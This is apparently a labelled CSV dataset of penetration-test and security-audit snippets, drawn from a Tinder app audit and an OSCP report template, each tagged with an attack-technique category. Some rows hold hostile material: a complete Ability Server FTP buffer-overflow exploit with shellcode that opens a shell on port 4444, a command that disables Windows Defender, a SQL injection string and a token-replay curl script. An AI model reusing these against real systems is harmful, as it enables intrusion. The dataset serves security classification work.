text,label
The code to prompt the user if they want to migrate always runs due to a logic bug. Not a security issue.,Background Information
Tinder Security Audit,Background Information
SSN Project 2013,Background Information
Joris Claassen Leendert v. Duijn Mick Pouw Esan Wit,Background Information
"{Joris.Claassen,Leendert.vanDuijn,Mick.Pouw,Esan.Wit}@os3.nl",Background Information
"Dating apps are common place in society. Many dating apps include the option to contact matched users and send text messages or images. Due to the amount of personal information potentially involved in the matchmaking process this a prime target for identity theft. If an app or service deals with personal information, it has to ensure the security of this private information. Since the Tinder application has a lot of users, it would be interesting to check this security.",Background Information
"The user has to supply some information before using the app. This includes a Facebook profile API credentials and eventually even GPS information. The information that can be collected from the Facebook profile could be valuable for eavesdroppers or third parties. Information like GPS, the actual location of the end user.",Background Information
"In this paper we will look in to the risks of using Tinder, what information is sent where and how securely this information is transported over the internet. We also look into whether information is stored at a third party or even Tinder itself. ",Background Information
 We will first discuss the materials and methods we used to research the Tinder application. We will then discuss the analysis we did on the Tinder application. eg. The offline and onlineanalysis. We will discuss certain,Background Information
attacksandpossibleweaknessesoftheTinderimplementation. Wewillthen,Background Information
draw a conclusion based on our results. We divided the research questions into several sub questions. These will be handled in the analysis. The sub,Background Information
 ## Offensive Security OSCP Exam Penetration Test Report The OffSec Lab and Exam penetration test report contains all efforts that were conducted in order to pass the OffSec course. This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the OffSec Certified Professional.,Background Information
"The objective of this assessment is to perform an internal penetration test against the OffSec Lab and Exam network. The student is tasked with following a methodical approach to obtaining access to the objective goals. This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report. An example page has already been created for you in the latter",Background Information
"portions of this document that should give you ample information on what is expected to pass this course. Use the sample report as a guideline to get you through the reporting. The student will be required to fill out this penetration testing report fully and to include the following sections: - Overall High-Level Summary and Recommendations (non-technical) - Methodology walkthrough and detailed outline of steps taken - Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.",Background Information
" - Any additional items that were not included John Doe was tasked with performing an internal penetration test towards OffSec Labs. an internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate OffSec",Background Information
"objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to OffSec. When performing the internal penetration test, there were several alarming vulnerabilities that were identified on OffSecs network. When performing the attacks, John was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations. During the testing, John",Background Information
"### Information Gathering

The information gathering portion of a penetration test focuses on
identifying the scope of the penetration test. During this penetration
test, John was tasked with exploiting the lab and exam network. The
specific IP addresses were:

**Exam Network**:

- `192.168.X.X`
- `192.168.X.X`
- `192.168.X.X`",Background Information
"The penetration testing portions of the assessment focus heavily on
gaining access to a variety of systems. During this penetration test,
John was able to successfully gain access to 3
out of the 50 systems.",Background Information
### Target #2 - 192.168.x.2,Background Information
**Severity**: Critical,Background Information
Login page accepted admin:admin as default credentials.,"Credential Access - Default, Leaked, or Compromised Credentials"
MySQL service allowed login with root and no password.,"Credential Access - Default, Leaked, or Compromised Credentials"
"While enumerating table data, John was able to successfully extract
the database root account login and password credentials that were
unencrypted that also matched username and password accounts for the
administrative user account on the system and John was able to log in
remotely using RDP. This allowed for a successful breach of the
operating system as well as all data contained on the system.","Credential Access - Default, Leaked, or Compromised Credentials"
"Manual enumeration of FTP allowed anonymous login, where multiple configuration files were found, including credentials.","Credential Access - Default, Leaked, or Compromised Credentials"
Accessed internal documentation from exposed Confluence server using default credentials.,"Credential Access - Default, Leaked, or Compromised Credentials"
The web admin interface for the camera system was accessible via HTTP and used the default vendor credentials (`admin:admin`). These credentials allowed unrestricted configuration changes and full video access.,"Credential Access - Default, Leaked, or Compromised Credentials"
Leveraged Kerberoasting to request service tickets and crack passwords offline.,Credential Access - Kerberoasting
"An attacker with domain access was able to request service tickets for accounts with SPNs. These tickets were then cracked offline using hashcat, exposing cleartext passwords for several service accounts with elevated privileges.",Credential Access - Kerberoasting
"#!/bin/sh
### Replace : With
### 11111111-2222-3333-4444-555555555555 : Currently valid token
### 2000-12-09T14:55:30.356Z : Earliest time the history includes
curl -v ""https://api.gotinder.com/updates"" \
-H ""X-Auth-Token: 11111111-2222-3333-4444-555555555555"" \
-A ""Tinder Android Version 2.0.1"" \
-H ""Content-Type: application/json; charset=utf-8"" \
-d '{""last_activity_date"":""2000-12-09T14:55:30.356Z""}'",Credential Access - Token Misuse Risk
"The mobile app stored long-lived Facebook access tokens in plaintext local storage. These tokens were sent with each request, and due to CORS misconfiguration, a malicious site could potentially steal them via cross-site scripting.",Credential Access - Token Misuse Risk
"If the Storage Provider URL is empty, an empty salt is used without warning.",Crypto Misuse - Nonstandard Salt
"The salt passed to PBKDF2 is a hex string, which is suboptimal.",Crypto Misuse - Nonstandard Salt
"Instead of using base64 or raw binary values, salts were derived from the hash of the current timestamp, leading to collisions and predictability under high concurrency environments.",Crypto Misuse - Nonstandard Salt
Only 100 iterations of PBKDF2 are used when deriving the encryption password. This low value was explicitly chosen for performance reasons.,Crypto Misuse - Weak KDF
"The system used a single iteration of SHA-1 for password storage instead of a dedicated key derivation function like PBKDF2, bcrypt, or scrypt. This makes brute-force attacks significantly more feasible.",Crypto Misuse - Weak KDF
The HMAC key used during password derivation is a hex-encoded string.,Crypto Misuse - Weak Key Format
"Hash0 derives another 'encryption password' from the main password, rather than using a binary key.",Crypto Misuse - Weak Key Format
"The cryptographic module allowed keys with non-uniform entropy and improper padding, such as short ASCII passphrases padded to key length with null bytes. This undermines the strength of symmetric encryption.",Crypto Misuse - Weak Key Format
The salts are generated with Math.random(). This is insecure. Salts must be generated with a CSPRNG.,Crypto Misuse - Weak Salt Generation
The encryption password is derived from the master password with a constant salt.,Crypto Misuse - Weak Salt Generation
The encryption key is derived from the master key with a fixed salt; more secure design needed.,Crypto Misuse - Weak Salt Generation
"The password hashing implementation used `Math.random()` to generate salts. This method is not cryptographically secure and could lead to predictable salts, allowing precomputed dictionary attacks using rainbow tables.",Crypto Misuse - Weak Salt Generation
"All user passwords were hashed using the same hardcoded salt value (`""somesaltvalue""`) across the application. This reduces entropy and makes it possible to precompute hashes offline for reuse against any account.",Crypto Misuse - Weak Salt Generation
Disabled Windows Defender via registry edits before payload deployment.,Defense Evasion - Antivirus Disable
"During the engagement, the red team deployed a PowerShell script that disabled Windows Defenders real-time protection using `Set-MpPreference -DisableRealtimeMonitoring $true`, allowing payloads to execute without detection.",Defense Evasion - Antivirus Disable
"Keys were derived by concatenating the password and username directly (e.g., `key = SHA256(password + username)`), bypassing standard key derivation libraries and lacking salting or iteration controls.",Design Flaw - Insecure Key Derivation
"Application generated encryption keys by hashing raw passwords directly with SHA1, skipping standard KDF mechanisms like PBKDF2, bcrypt, or scrypt.",Design Flaw - Insecure Key Derivation
"Keys were generated by reversing the user's birthdate and concatenating it with a static site-wide string, without salting or stretching.",Design Flaw - Insecure Key Derivation
"The custom encryption module did not validate the key size before accepting user-provided keys, allowing weak or improperly sized inputs that failed to meet minimum security standards for AES encryption.",Design Flaw - Missing Parameter Validation
"The encryption routine accepted user-provided keys without enforcing length or entropy requirements, resulting in the use of 40-bit keys for AES-256 encryption.",Design Flaw - Missing Parameter Validation
"The API failed to validate the initialization vector (IV) size before processing decryption, leading to truncated inputs that weakened cryptographic strength.",Design Flaw - Missing Parameter Validation
"The system derived keys using the users email address as the seed for a deterministic PRNG, resulting in predictable and replicable encryption keys for each user.",Design Flaw - Predictable Key Derivation
"Encryption keys for each session were derived from the userâ€™s username and timestamp, enabling attackers to precompute likely key values.",Design Flaw - Predictable Key Derivation
"A global key derivation pattern based on incremental user IDs (e.g., `key = hash(1000 + user_id)`) made it trivial to guess keys for other users.",Design Flaw - Predictable Key Derivation
Using PBKDF2 then HMAC is unnecessary; better to encode in the PBKDF2 salt directly.,Design Flaw - Redundant Crypto
"The application encrypted data using AES-128, then applied a second, independent encryption layer using a custom XOR cipher. This provided no additional security benefit and introduced unnecessary complexity and potential for error.",Design Flaw - Redundant Crypto
" Decompilation of the Tinder APK file provided some clear insights for fur- ther research. It provided us with a list of libraries used by Tinder, API endpoints, and some clarification on the authentication scheme used.",Discovery - API Exposure via Static Analysis
 Due to incomplete obfuscation of the APK10 file certain resources could easily be identified. The base URL of the Tinder API was also revealed to be Â‘https://api.gotinder.comÂ’.,Discovery - API Exposure via Static Analysis
"URL_MEDIA_BASE = ""/media"";URL_MEDIA = ""https://content.gotinder.com"" + URL_MEDIA_BASE; URL_USER_BASE = URL_BASE + ""/user/""; URL_AUTH = URL_BASE + ""/auth""; URL_MATCHES = URL_USER_BASE + ""matches/""; URL_PING = URL_USER_BASE + ""ping""; URL_PROFILE = URL_USER_BASE + ""profile""; URL_RECS = URL_USER_BASE + ""recs""; URL_UPDATES = URL_BASE + ""/updates""; URL_REGISTER_PUSH = URL_BASE + ""/device/android""; URL_DESTINATIONS_LIST = URL_BASE + ""/destinations""; URL_DESTINATION = URL_BASE + ""/destinations/""; URL_REPORT = URL_BASE + ""/report/""; URL_LIKE_ADJUNCT = ""/like""; URL_PASS_ADJUNCT = ""/pass"";",Discovery - API Exposure via Static Analysis
We also found that the API is adding an X-Auth-Token header to each request with a token retrieved from the /auth endpoint.,Discovery - API Exposure via Static Analysis
Used DNS zone transfer on misconfigured server to enumerate internal hostnames and IP addresses.,Discovery - DNS Enumeration
"Queried a misconfigured DNS server for AXFR records, successfully retrieving a full zone file containing all subdomains.",Discovery - DNS Enumeration
Performed reverse DNS lookups on discovered IP ranges to identify hostnames and network structure within the internal environment.,Discovery - DNS Enumeration
"### Target #1 - 192.168.x.1

#### Service Enumeration

##### Port Scan Results

|IP Address|Ports Open|
|---|---|
|192.168.x.1|**TCP**: 8080<br/>**UDP**: 1433, 3389|",Discovery - Enumeration
"#### Service Enumeration

##### Port Scan Results

|IP Address|Ports Open|
|---|---|
|192.168.x.2|**TCP**: 80, 443<br/>**UDP**:|
",Discovery - Enumeration
"### Target #1 - 192.168.x.3

#### Service Enumeration

##### Port Scan Results

|IP Address|Ports Open|
|---|---|
|192.168.x.1|**TCP**: 80, 443<br/>**UDP**: 1433, 3389|",Discovery - Enumeration
"The initial scanning revealed several services running on open ports:
- Port 21 (FTP)
- Port 22 (SSH)
- Port 80 (HTTP)",Discovery - Enumeration
Scanned subnet with Nmap and discovered open FTP and SSH ports.,Discovery - Recon / Analysis Method
" Our research focuses on several particular attack vectors against the plat- form. We will analyze several aspects of the application. User authentica-tion, authentication of API server(s), possible user-base enumeration, and leaking of information via side channels. We will investigate this by using a combination of static offline analysis of the program code and analysis of live network traffic.",Discovery - Recon / Analysis Method
"
The static analysis of the Tinder application was by decompiling the source files from a retrieved APK file using APK to Java1. This APK file has been retrieved from a rooted android device. The decompiler used was the freely available jd-gui[4].",Discovery - Recon / Analysis Method
"The purpose of the static analysis is to extract some information on how Tinder is implemented. We focus on which libraries are used, how communication is handled and if there are any obvious flaws in the implementation.
We will also attempt to extract the structure of their API for later use.",Discovery - Recon / Analysis Method
 The network traffic was analyzed by using a Man in the Middle(MitM) attack. To do this we setup an access-point using a laptop and airbase-ng2. The access point would then forward all requests via iptables to our proxy.,Discovery - Recon / Analysis Method
 To complete our MitM setup we needed to proxy HTTP(S) requests and fake certificates for the various requested web resources. Because we wanted to analyze all requests we chose to set our proxy in transparent setup as opposed to defining the proxy in the WiFi settings. Reason for this is that applications on Android don't use the proxy as configured in the WiFi settings. As such we required a proxy which could generate SSL certificates for the various end-points requested by the application. ,Discovery - Recon / Analysis Method
First we used the Burp suite[5]. This program sat as a proxy between client and server but allowed the user to change the data in the middle. This would allow us to change request and response data without having to create a placeholder server. However it turned out that Burp did not have the option to run completely transparent and serve proper SSL certificates.,Discovery - Recon / Analysis Method
"After this we had a brief look into using MitM proxy3, as this was pre- viously used for exactly this purpose in another analysis[1]. However we didn -t manage to configure it to run transparently with our setup",Discovery - Recon / Analysis Method
Finally we settled on an implementation using SSLsplit4. This allowed us to use our own certificate authority to generate proper SSL certificates for any endpoint connected to during our tests. By importing this authority we were able to run the Tinder application while logging all traffic to plaintext files for later inspection. However for a casual attacker this would be highly impractical as we had to manually install the certificate authority and accept severe warnings to get it to work. ,Discovery - Recon / Analysis Method
" After having concluded our offline analysis we started our online analysis, using our test setup as described in section 3.2.1. During this process we had two test users run the app on several occasions, both instructions to generate a representative stream of requests for a complete analysis of ap- plication behavior and possible weaknesses. We inspected the logs collected to investigate where certain data was sent, whether it was secured in transit, and whether there were other feature worth investigating.",Discovery - Recon / Analysis Method
" We inspected the hosts the device running the application connected to, after eliminating traffic from non Tinder related hosts we were left with the following hosts using HTTPS: Number of requests Hostname 66 api.crittercism.com 3635 api.gotinder.com",Discovery - Recon / Analysis Method
Enumerated SMB shares using smbclient and found accessible shares.,Discovery - Service Enumeration
had administrative level access to multiple systems. All systems were successfully exploited and access granted. These systems as well as a brief description on how access was obtained are listed below: - `192.168.x.1` - Anonymous SMB share leads to Wordpress RCE,Discovery - Service Enumeration
" The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailedinformation on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.",Discovery - Service Enumeration
"
**Steps to reproduce**: Ran the initial service scan John discovered that this host is called
Sehnzi. Smbclient was used to interact on the port 445 to get the
passwords.txt file from SMB share shenzi and",Discovery - Service Enumeration
 #### Privilege Escalation - MySQL Injection,Discovery - Service Enumeration
Passwordmaker uses charAt() which could be exploited in a side-channel attack.,Discovery - Side Channel Analysis
"Timing variations were observed in the password comparison logic, indicating that a timing side-channel could be exploited to infer valid characters.",Discovery - Side Channel Analysis
"The encryption function leaked processing time differences based on input values, enabling potential attackers to recover key material through repeated measurements.",Discovery - Side Channel Analysis
"By analyzing CPU cache behavior during repeated operations, the attacker could identify memory access patterns linked to sensitive information.",Discovery - Side Channel Analysis
Tinder uses several libraries which appear to have code enabling network connectivity. These libraries may provide a channel from which information may be obtained. The libraries found are: Apphance5 Usage analysis and user feedback syndication. Crittercism6 Analytics and trend development. Facebook7 User authentication. Kontagent8 Analytics and trend development. Volley9 Android networking library.,Discovery - Third - Party Data Leak
"Apphance, Crittercism and Kontagent are all products related to app usage analysis. Apphance seems to be dedicated to analysis of app crashes. Since the app did not crash during testing we have not intercepted any re- quest of Apphance. Crittercism and Kontagent are used for usage analytics. Crittercism seems to be focused on application usage and device statistics whilst Kontagent seems focused on user details and interactions.",Discovery - Third - Party Data Leak
"Tinder requires its users to register and log in using Facebook. Facebook log in uses a token which, once generated, can be used by any interested party. As such it might be possible to log a user in with a third party Facebook token. To check this we will attempt a log in request to the API of Tinder and replace their Facebook token with one of our own. If Tinder does not verify whether or not the supplied token is created using their own Facebook app this will allow any Facebook app owner to attempt to log in to Tinder for a user.",Discovery - Token Misuse Risk
" If it is possible to log in to the Tinder API using a random access token from another application this may enable third parties to profile users of Tinder or manipulate existing contacts, current recommendations, and chat conversations",Discovery - Token Misuse Risk
 Facebook is used for user registration and log in. The app retrieves an authorized token from the library which is used to log in with the Tinder backend.,Discovery - Token Misuse Risk
A Nikto scan was run against the HTTP service revealing outdated software and potential misconfigurations.,Discovery - Vulnerability Scanning
"A Nessus scan identified several critical CVEs affecting the web server, including remote code execution and privilege escalation vulnerabilities.",Discovery - Vulnerability Scanning
"An OpenVAS scan revealed multiple high-risk vulnerabilities in the backend database service, including weak authentication and exposed admin interfaces.",Discovery - Vulnerability Scanning
"A Qualys scan was performed against the DMZ subnet, highlighting outdated SSL configurations and missing security patches across several hosts.",Discovery - Vulnerability Scanning
The SJCL decrypt() function will throw an exception if the key is wrong or data is tampered. Hash0 does not handle this and crashes.,Error Handling - Insecure Exception Management
"The application fails to catch database connection exceptions, causing the entire system to crash when the database is unavailable.",Error Handling - Insecure Exception Management
"During invalid input processing, the system throws unhandled exceptions that leak internal stack trace information to the client.",Error Handling - Insecure Exception Management
"When authentication fails due to a malformed token, the application crashes instead of gracefully rejecting the request.",Error Handling - Insecure Exception Management
Exported entire customer database from a misconfigured public S3 bucket.,Exfiltration - Cloud Storage Misconfiguration
Exposed Jenkins dashboard allowed anonymous command execution on build nodes.,Exploitation - CI/CD Remote Code Execution
"Initial Access - Buffer Overflow
Vulnerability Explanation: Ability Server 2.34 is subject to a buffer overflow vulnerability in STOR field. Attackers can use this vulnerability to cause arbitrary remote code execution and take completely control over the system.",Exploitation - Code Execution
"Steps to reproduce: The operating system was different from the known public exploit. A rewritten exploit was needed in order for successful code execution to occur. Once the exploit was rewritten, a targeted attack was performed on the system which gave John full administrative access over the system.",Exploitation - Code Execution
"PoC: Modifications to the existing exploit were needed and are marked with comments:

  ###################################
  # Ability Server 2.34 FTP STOR Buffer Overflow
  # Advanced, secure and easy to use FTP Server.
  # 21 Oct 2004 - muts
  ###################################
  # D:\BO>ability-2.34-ftp-stor.py
  ###################################
  # D:\data\tools>nc -v 127.0.0.1 4444
  # localhost [127.0.0.1] 4444 (?) open
  # Microsoft Windows XP [Version 5.1.2600]
  # (C) Copyright 1985-2001 Microsoft Corp.
  # D:\Program Files\abilitywebserver>
  ###################################

  import ftplib
  from ftplib import FTP
  import struct
  print ""\n\n################################""
  print ""\nAbility Server 2.34 FTP STOR buffer Overflow""
  print ""\nFor Educational Purposes Only!\n""
  print ""###################################""

  # Shellcode taken from Sergio Alvarez's ""Win32 Stack Buffer Overflow Tutorial""

  sc = ""\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66""
  sc += ""\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6""
  sc += ""\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba""
  sc += ""\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb""
  sc += ""\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc""
  sc += ""\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61""
  sc += ""\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70""
  sc += ""\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44""
  sc += ""\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7""
  sc += ""\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69""
  sc += ""\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9""
  sc += ""\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0""
  sc += ""\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3""
  sc += ""\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7""
  sc += ""\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0""
  sc += ""\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67""
  sc += ""\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1""
  sc += ""\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0""
  sc += ""\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88""
  sc += ""\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d""
  sc += ""\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95""
  sc += ""\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2""
  # Change RET address if need be.
  buffer = '\x41'*966+struct.pack('<L', 0x7C2FA0F7)+'\x42'*32+sc # RET Windows 2000 Server SP4
  #buffer = '\x41'*970+struct.pack('<L', 0x7D17D737)+'\x42'*32+sc # RET Windows XP SP2
  try:
      # Edit the IP, Username and Password.
      ftp = FTP('127.0.0.1')
      ftp.login('ftp','ftp')
      print ""\nEvil Buffer sent...""
      print ""\nTry connecting with netcat to port 4444 on the remote machine.""
  except:
      print ""\nCould not Connect to FTP Server.""

  try:
      ftp.transfercmd(""STOR "" + buffer)
  except:
      print ""\nDone.""",Exploitation - Code Execution
"**Vulnerability Explanation**: After establishing a foothold on target, John noticed there were
several applications running locally, one of them, a custom web
application on port 80 was prone to SQL Injection attacks. Using
Chisel for port forwarding, John was able to access the web
application. When performing the penetration test, John noticed
error-based MySQL Injection on the taxid query string parameter.
",Exploitation - Code Execution
**Steps to reproduce**: Execute the injection on the taxid query string parameter.,Exploitation - Code Execution
"**PoC**:
Injection code:

```sql
SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE ""%root%""
```",Exploitation - Code Execution
Analyzing files left behind by the app on the system opened up some new locations where data could be leaked. Most noteworthy is the Â‘tinder.dbÂ’ file which is an unencrypted SQLite3 database. This database houses informa- tion on past and future gradings as well as a complete chat history. Since this files is protected by Android to only be accessible by the app itself this is generally okay. However on rooted devices or with the possibility of a new exploit encryption might be preferable over the performance loss.,Exploitation - Insecure Local Storage
Captured NTLMv2 hashes via LLMNR spoofing and used them in an SMB relay attack.,Exploitation - LLMNR Spoofing
Used kernel exploit to escalate privileges from user to root.,Exploitation - Privilege Escalation
#### Privilege Escalation - Scripts running as root user ,Exploitation - Privilege Escalation
